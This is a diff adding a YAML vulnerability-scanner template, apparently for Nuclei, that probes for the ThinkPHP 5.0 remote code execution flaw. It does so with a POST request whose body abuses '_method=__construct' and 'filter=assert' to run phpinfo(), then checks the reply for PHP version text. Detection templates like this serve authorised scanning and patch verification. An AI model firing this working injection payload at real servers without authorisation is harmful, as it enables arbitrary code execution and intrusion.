@@ -1,0 +1,23 @@
+id: tp-50-rce
+info:
+  author: str1am
+  name: "ThinkPHP\u547D\u4EE4\u6267\u884C"
+  severity: critical
+  tags: thinkphp,rce
+requests:
+- body: s=phpinfo()&_method=__construct&filter=assert
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    type: word
+    words:
+    - PHP Extension
+    - PHP Version
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/?s=index/index/index'
